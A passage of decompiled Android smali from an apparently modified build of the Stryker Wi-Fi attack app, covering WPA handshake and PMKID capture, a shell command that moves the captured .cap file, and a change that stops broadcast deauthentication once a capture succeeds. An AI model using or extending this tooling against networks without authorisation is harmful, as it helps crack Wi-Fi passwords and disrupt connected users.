    new-instance v4, Ljava/io/File;

    .line 728
    .line 729
    invoke-direct {v4, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 730
    .line 731
    .line 732
    invoke-virtual {v4}, Ljava/io/File;->isFile()Z

    .line 733
    .line 734
    .line 735
    move-result v4

    .line 736
    if-eqz v4, :cond_19

    .line 737
    .line 738
    goto :goto_d

    .line 739
    :cond_19
    invoke-static {v2}, Lorg/bouncycastle/math/ec/a;->a(Ll4/l;)Z

    .line 740
    .line 741
    .line 742
    move-result v4

    .line 743
    if-eqz v4, :cond_1b

    .line 744
    .line 745
    :cond_1a
    move-object v1, v5

    .line 746
    goto :goto_d

    .line 747
    :cond_1b
    new-instance v4, Ljava/lang/StringBuilder;

    .line 748
    .line 749
    const-string v6, "mkdir -p \'"

    .line 750
    .line 751
    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 752
    .line 753
    .line 754
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 755
    .line 756
    .line 757
    const-string v0, "\'; src=$(ls -1t \'"

    .line 758
    .line 759
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 760
    .line 761
    .line 762
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 763
    .line 764
    .line 765
    const-string v0, "\'/handshake-*.cap 2>/dev/null | head -n 1); if [ -n \"$src\" ]; then mv -f \"$src\" \'"

    .line 766
    .line 767
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 768
    .line 769
    .line 770
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 771
    .line 772
    .line 773
    const-string v0, "\'; fi"

    .line 774
    .line 775
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 776
    .line 777
    .line 778
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 779
    .line 780
    .line 781
    move-result-object v0

    .line 782
    invoke-virtual {v2, v0}, Ll4/l;->r(Ljava/lang/String;)V

    .line 783
    .line 784
    .line 785
    new-instance v0, Ljava/io/File;

    .line 786
    .line 787
    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 788
    .line 789
    .line 790
    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    .line 791
    .line 792
    .line 793
    move-result v0

    .line 794
    if-eqz v0, :cond_1a

    .line 795
    .line 796
    :goto_d
    if-nez v1, :cond_1c

    .line 797
    .line 798
    const-string v0, "Capture file not found \u2014 nothing was saved."

    .line 799
    .line 800
    invoke-virtual {v10, v0}, Ll4/h;->e(Ljava/lang/String;)V

    .line 801
    .line 802
    .line 803
    const/4 v4, 0x1

    .line 804
    goto :goto_f

    .line 805
    :cond_1c
    new-instance v0, Ljava/lang/StringBuilder;

    .line 806
    .line 807
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 808
    .line 809
    .line 810
    iget-object v2, v10, Lo4/p;->j:[Z

    .line 811
    .line 812
    const/4 v3, 0x0

    .line 813
    aget-boolean v2, v2, v3

    .line 814
    .line 815
    if-eqz v2, :cond_1d

    .line 816
    .line 817
    const-string v2, "Handshake"

    .line 818
    .line 819
    goto :goto_e

    .line 820
    :cond_1d
    const-string v2, "PMKID"

    .line 821
    .line 822
    :goto_e
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 823
    .line 824
    .line 825
    const-string v2, " saved to "

    .line 826
    .line 827
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 828
    .line 829
    .line 830
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 831
    .line 832
    .line 833
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 834
    .line 835
    .line 836
    move-result-object v0

    .line 837
    invoke-virtual {v10, v0}, Ll4/h;->e(Ljava/lang/String;)V

    .line 838
    .line 839
    .line 840
    iget-object v0, v10, Ll4/h;->b:Landroid/content/Context;

    .line 841
    .line 842
    iget-object v1, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 843
    .line 844
    invoke-virtual {v1}, Lcom/zalexdev/stryker/custom/WiFINetwork;->getMac()Ljava/lang/String;

    .line 845
    .line 846
    .line 847
    move-result-object v1

    .line 848
    iget-object v2, v10, Lo4/p;->m:Lcom/zalexdev/stryker/custom/WiFINetwork;

    .line 849
    .line 850
    iget-object v2, v2, Lcom/zalexdev/stryker/custom/WiFINetwork;->ssid:Ljava/lang/String;

    .line 851
    .line 852
    sget-object v3, Ly2/a;->c:Ly2/a;

    .line 853
    .line 854
    const/4 v4, 0x1

    .line 855
    invoke-static {v0, v1, v2, v3, v4}, Lw2/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ly2/a;Z)V

    .line 856
    .line 857
    .line 858
    :goto_f
    iget-object v0, v10, Ll4/h;->a:Landroid/app/Activity;

    .line 859
    .line 860
    new-instance v1, Lo4/m;

    .line 861
    .line 862
    invoke-direct {v1, v10, v4}, Lo4/m;-><init>(Ll4/h;I)V

    .line 863
    .line 864
    .line 865
    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 866
    .line 867
    .line 868
    goto :goto_10

    .line 869
    :cond_1e
    const-string v0, "Failed to start monitor mode"

    .line 870
    .line 871
    invoke-virtual {v10, v0}, Ll4/h;->e(Ljava/lang/String;)V

    .line 872
    .line 873
    .line 874
    invoke-virtual/range {p0 .. p0}, Ll4/h;->f()V

    .line 875
    .line 876
    .line 877
    :goto_10
    return-void
.end method

.method public final b(Ljava/lang/String;)V
    .locals 1

    .line 1
    const-string v0, "\n"

    .line 2
    .line 3
    invoke-static {p1, v0}, Lo/i;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    move-result-object p1

    .line 7
    iget-object v0, p0, Lo4/p;->l:Landroid/widget/TextView;

    .line 8
    .line 9
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 10
    .line 11
    .line 12
    iget-object p1, p0, Lo4/p;->q:Lo4/u;

    .line 13
    .line 14
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 15
    .line 16
    .line 17
    invoke-static {v0}, Lo4/u;->f(Landroid/widget/TextView;)V

    .line 18
    .line 19
    .line 20
    return-void
.end method

.method public final c()V
    .locals 8

    .line 1
    const-string v0, "Attack was canceled due to critical error, please check log for more information!"

    invoke-virtual {p0, v0}, Ll4/h;->e(Ljava/lang/String;)V

    iget-object v3, p0, Lo4/p;->e:Landroid/widget/ImageView;

    iget-object v4, p0, Lo4/p;->f:Landroid/widget/ProgressBar;

    iget-object v5, p0, Lo4/p;->i:Landroid/widget/TextView;

    iget-object v6, p0, Lo4/p;->p:Ljava/util/Timer;

    new-instance v0, Ln1/b0;

    const/4 v7, 0x5

    move-object v1, v0

    move-object v2, p0

    invoke-direct/range {v1 .. v7}, Ln1/b0;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    iget-object v1, p0, Ll4/h;->a:Landroid/app/Activity;

    invoke-virtual {v1, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    # F2.3: restore interfaces from monitor mode when the capture attack is canceled
    iget-object v1, p0, Ll4/h;->c:Ll4/l;

    iget-object v0, v1, Ll4/l;->e:Ll4/m;

    invoke-virtual {v1}, Ll4/l;->y()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ll4/m;->b(Ljava/lang/String;)Z

    invoke-virtual {v1}, Ll4/l;->B()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ll4/m;->b(Ljava/lang/String;)Z

    return-void
.end method

.method public final d()V
    .locals 5

    # F2.2: deauth dirigido - once a handshake/PMKID was captured, stop the
    # broadcast deauth so the AP is not re-keyed and the capture stays valid.
    iget-object v4, p0, Lo4/p;->q:Lo4/u;

    iget-object v4, v4, Lo4/u;->g:Ll4/c;

    if-eqz v4, :cond_f22

    invoke-virtual {v4}, Ll4/c;->a()V

    const-string v4, "Deauth stopped - handshake already captured, capture is valid"

    invoke-virtual {p0, v4}, Lo4/p;->b(Ljava/lang/String;)V

    :cond_f22
    .line 1
    const/high16 v0, 0x3f800000    # 1.0f

    invoke-static {v0}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object v0

    iget-object v1, p0, Ll4/h;->c:Ll4/l;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    iget-object v1, p0, Lo4/p;->e:Landroid/widget/ImageView;

    invoke-static {v1, v0}, Ll4/l;->m0(Landroid/view/View;Ljava/lang/Float;)V

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    move-result-object v0

    iget-object v1, p0, Lo4/p;->f:Landroid/widget/ProgressBar;

    invoke-static {v1, v0}, Ll4/l;->m0(Landroid/view/View;Ljava/lang/Float;)V

    iget-object v0, p0, Lo4/p;->g:Landroid/widget/TextView;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setVisibility(I)V

    iget-object v2, p0, Lo4/p;->h:Landroid/view/View;

    const/16 v3, 0x8

    invoke-virtual {v2, v3}, Landroid/view/View;->setVisibility(I)V

    iget-object v2, p0, Lo4/p;->i:Landroid/widget/TextView;

    const v3, 0x104000a

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(I)V

    iget-object v2, p0, Lo4/p;->j:[Z

    aget-boolean v2, v2, v1

    if-eqz v2, :cond_0

    const-string v1, "Handshake captured!\n Check Stryker/captured/ folder"

    :goto_0
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_1

    :cond_0
    iget-object v2, p0, Lo4/p;->k:[Z

    aget-boolean v1, v2, v1

    if-eqz v1, :cond_1

    const-string v1, "PMKID captured!\n Check Stryker/captured/ folder"

    goto :goto_0

    :cond_1
    const-string v1, "Handshake not captured"

    goto :goto_0

    :goto_1
    return-void
.end method
